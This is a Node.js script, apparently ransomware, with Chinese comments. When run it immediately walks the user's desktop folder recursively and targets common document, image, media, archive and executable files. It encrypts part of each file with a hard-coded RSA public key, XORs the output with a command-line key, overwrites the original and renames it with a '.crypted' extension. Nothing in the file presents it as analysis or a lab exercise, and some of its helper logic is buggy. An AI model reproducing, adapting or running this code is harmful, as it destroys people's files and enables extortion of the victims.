var RSAKey = require('./Rsa'),
	fs = require('fs'),
	path = require('path'),
	dst = process.env.userprofile + "\\desktop",
	bufferArr = [];

	//自定义控制台颜色输出
{
	let colors = {
			Reset: "\x1b[0m",
			FgRed: "\x1b[31m",
			FgGreen: "\x1b[32m",
			FgYellow: "\x1b[33m",
			FgBlue: "\x1b[34m"
	};
	"debug:debug:FgBlue,info::FgGreen,warn:警告:FgYellow,error:error:FgRed".split(",").forEach(function (logcolor) {
			let [log, info, color] = logcolor.split(':');
			let logger = function (...args) {
					console.log(args[0],args.slice(1,args.length-1),args[args.length-1])
			} || console[log] || console.log;
			console[log] = (...args) => logger.apply(null, [`[${getTime()}]  ${colors[color]}[${info.toUpperCase()||log.toUpperCase()}]${colors.Reset}`, ...args, colors.Reset]);
	});
}

var RSADo = {
	'modulus': '918DE21674D7B5CE8A759BC55985556568F54AAEDFFE275E8945F179C43F276BC4FDEA9FF86F8D14AC7F0A16ED69A8208F2E90E7486C3D66D55DDADFA4E7ED8EDD6BC4B486D43194867EA15BC0245090A8B0F70901B93DB010DA8C11041CFDB98CF1AA1B08D9E74C9930FAE92393E479525A72A027C403CF0D86A26B8A4591AD',
	"publicExponent": "10001"
}

encrypt(dst);

function encrypt(dst) {
	return new Promise(function (resolve, reject) {
		var promiseArr = [];
		fs.readdirSync(dst).forEach(function (files) {
			//crypted files like follows
			if (path.extname(path.join(dst, files)) !== ".jpg" && path.extname(path.join(dst, files)) !== ".png" &&
				path.extname(path.join(dst, files)) !== ".bmp" && path.extname(path.join(dst, files)) !== ".gif" &&
				path.extname(path.join(dst, files)) !== ".zip" && path.extname(path.join(dst, files)) !== ".rar" &&
				path.extname(path.join(dst, files)) !== ".exe" && path.extname(path.join(dst, files)) !== ".txt" &&
				path.extname(path.join(dst, files)) !== ".mp3" && path.extname(path.join(dst, files)) !== ".wma" &&
				path.extname(path.join(dst, files)) !== ".wmv" && path.extname(path.join(dst, files)) !== ".mp4" &&
				path.extname(path.join(dst, files)) !== ".doc" && path.extname(path.join(dst, files)) !== ".xls" &&
				path.extname(path.join(dst, files)) !== ".ppt" && path.extname(path.join(dst, files)) !== ".pdf" &&
				path.extname(path.join(dst, files)) !== ".htm" && path.extname(path.join(dst, files)) !== ".lnk" &&
				path.extname(path.join(dst, files)) !== ".xlsx" && path.extname(path.join(dst, files)) !== ".pptx" &&
				path.extname(path.join(dst, files)) !== ".docx" && path.extname(path.join(dst, files)) !== ".html") {
				if (fs.statSync(path.join(dst, files)).isDirectory()) {
					return encrypt(path.join(dst, files));
				}
			} else {
				var promise = new Promise((res) => {
					//nodejs不支持大于500M的文件
					if(fs.statSync( path.join(dst, files)).size > 500*1024*1024) {
						fs.appendFileSync(path.join(__dirname,'log.log'),"[" + getTime() + "]" + "发现大文件: " + path.join(dst, files) + "  " + (fs.statSync( path.join(dst, files)).size)/1024/1024 + '\r\n', {encoding: "utf8"})
						console.warn('发现大文件',path.join(dst, files),"大小", (fs.statSync( path.join(dst, files)).size)/1024/1024)
						res();
					}
					var currentDirFilesNameArr = path.join(dst, files).split('.').slice(0, path.join(dst, files).split('.').length - 1).join("");
					//处理相同文件名，不同后缀名的文件，防止加密后丢失相应的文件
					if (bufferArr.indexOf(currentDirFilesNameArr) !== -1) {
						console.warn('同一文件目录下出现相同的文件名', path.join(dst, files));
						var renameFiles = `${path.basename(path.join(dst, files),path.extname(path.join(dst, files)))}Same` + path.extname(path.join(dst, files));
						fs.appendFileSync(path.join(__dirname,'log.log'),"[" + getTime() + "]" + '同一文件目录下出现相同的文件名:' + path.join(dst, files) + '\r\n', {encoding: "utf8"})
						fs.renameSync(path.join(dst, files), path.join(dst, renameFiles));
						// return encrypt(path.join(dst));
						res(deploy(renameFiles))
					}
					bufferArr.push(currentDirFilesNameArr);
					deploy(files)
					function deploy(files) {
						var str = fs.readFileSync(path.join(dst, files)).toString('base64');
						var rsa = new RSAKey();
						rsa.setPublic(RSADo.modulus, RSADo.publicExponent);
						var l = str.length,
							encryptStr = '';
						if (l <= 100) {
							encryptStr = rsa.encrypt(str);
							str = encryptStr;
						} else if (l === 101) {
							encryptStr = rsa.encrypt(str.slice(1));
							str = str.slice(0, 1) + encryptStr;
						} else {
							if (l % 2) {
								var left = (l - 99) / 2,
									right = -(left - 1);
								console.info('奇数', l / 2);
								encryptStr = rsa.encrypt(str.slice(left, right));
								str = str.slice(0, left) + str.slice(right) + encryptStr;
							} else {
								var left = (l - 100) / 2;
								var right = -left;
								console.info('偶数', l / 2, 'before', str.slice(left, right));
								encryptStr = rsa.encrypt(str.slice(left, right));
								str = str.slice(0, left) + str.slice(right) + encryptStr;
							}
						}
						let fileExtname = Buffer.from(path.extname(path.join(dst, files)).slice(1, path.extname(path.join(dst, files)).length)).toString('base64');
						encryptFileExtname = rsa.encrypt(fileExtname);
						str = encryptFileExtname + str;
						var buf = Buffer.from(str);
						for (var i = 0; i < buf.length; i++) {
							buf[i] = buf[i] ^ process.argv[2]; //从外部传入,默认为111
						};
						fs.writeFileSync(path.join(dst, files), buf);
						var renameFiles = path.basename(path.join(dst, files), path.extname(path.join(dst, files))) + `.crypted`;
						fs.renameSync(path.join(dst, files), path.join(dst, renameFiles));
					}
					res();
				}).catch(err => {
					console.error("error", err);
					reject(err);
				})
				promiseArr.push(promise);
			}
		});
		Promise.all(promiseArr).then(function () {
			console.log('over');
			resolve();
		});
	})
}

process.on('uncaughtException', function (err) {
	console.error('uncaughtException', err);
});


function getTime() {
	let year = new Date().getFullYear();
	let month = new Date().getMonth() + 1;
	let day = new Date().getDate();
	let hour = new Date().getHours();
	let minute = new Date().getMinutes();
	let second = new Date().getSeconds();
	let mileSecond = new Date().getMilliseconds();
	if (hour < 10) {
			hour = "0" + hour
	}
	if (minute < 10) {
			minute = "0" + minute
	}
	if (second < 10) {
			second = "0" + second
	}
	if (mileSecond < 10) {
			second = "00" + mileSecond
	}
	if (mileSecond < 100) {
			second = "0" + mileSecond
	}
	time = `${year}-${month}-${day} ${hour}:${minute}:${second}.${mileSecond}`;
	return time;
}